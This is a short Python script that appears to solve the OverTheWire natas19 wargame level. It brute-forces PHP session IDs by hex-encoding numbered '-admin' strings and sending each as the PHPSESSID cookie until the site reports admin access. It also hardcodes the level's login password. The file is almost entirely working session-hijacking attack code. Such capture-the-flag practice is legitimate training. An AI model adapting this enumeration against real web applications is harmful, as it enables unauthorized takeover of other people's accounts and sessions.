# PHP SessionID Bruteforce

import binascii
import re
import threading
import requests
import colorama
from bs4 import BeautifulSoup
from colorama import Fore, Style


def sessionIdBruteforce(i):
    id = binascii.hexlify(f"{i}-admin".encode()).decode()
    resp = session.get(url=url, cookies={"PHPSESSID": id})

    if "You are an admin" in resp.text:
        soup = BeautifulSoup(resp.text, 'lxml')
        print(i)
        print(re.sub("View sourcecode", "", soup.div.text))
    else:
        print(f"[-] Brute forcing PHPSESSID: {i}")


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)

# Empty Thread lists
threads = []


for i in range(1, 500):
    sessionIdBruteforce(i)
    # thread = threading.Thread(target=sessionIdBruteforce, args=(i,))
    # thread.start()
    # threads.append(thread)


# Wait for all threads to finish
for thread in threads:
    thread.join()
